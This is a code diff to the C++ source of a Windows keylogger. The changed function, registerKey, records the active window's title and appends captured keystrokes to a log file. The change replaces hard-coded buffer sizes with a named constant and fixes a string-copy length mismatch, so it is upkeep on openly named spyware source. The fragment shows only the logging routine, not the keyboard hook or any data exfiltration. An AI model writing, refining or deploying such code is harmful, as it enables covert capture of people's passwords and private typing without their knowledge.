@@ -14,8 +14,11 @@ Keylogger& Keylogger::getInstance() {
 
 void Keylogger::registerKey(std::string key) {
 	HWND currentWindowHWND = GetForegroundWindow();
-	char* currentWindowTitle = (char*)malloc(255);
-	GetWindowTextA(currentWindowHWND, currentWindowTitle, 255);
+
+	constexpr unsigned MAX_WINDOW_TITLE_SIZE = 255;
+
+	char* currentWindowTitle = (char*)malloc(MAX_WINDOW_TITLE_SIZE);
+	GetWindowTextA(currentWindowHWND, currentWindowTitle, MAX_WINDOW_TITLE_SIZE);
 	DWORD bytesWritten;
 	SetFilePointer(Keylogger::getInstance().logFile, 0, NULL, FILE_END);
 	if (Keylogger::getInstance().lastWindowTitle == NULL || strcmp(Keylogger::getInstance().lastWindowTitle, currentWindowTitle) != 0) {
@@ -24,8 +27,8 @@ void Keylogger::registerKey(std::string key) {
 		WriteFile(Keylogger::getInstance().logFile, "\n", 1, &bytesWritten, NULL);
 		if (Keylogger::getInstance().lastWindowTitle != NULL)
 			free(Keylogger::getInstance().lastWindowTitle);
-		Keylogger::getInstance().lastWindowTitle = (char*)malloc(100);
-		strcpy_s(Keylogger::getInstance().lastWindowTitle, 100, currentWindowTitle);
+		Keylogger::getInstance().lastWindowTitle = (char*)malloc(MAX_WINDOW_TITLE_SIZE);
+		strncpy_s(Keylogger::getInstance().lastWindowTitle, MAX_WINDOW_TITLE_SIZE, currentWindowTitle, MAX_WINDOW_TITLE_SIZE);
 	}
 	WriteFile(Keylogger::getInstance().logFile, key.c_str(), strlen(key.c_str()), &bytesWritten, NULL);
 	free(currentWindowTitle);
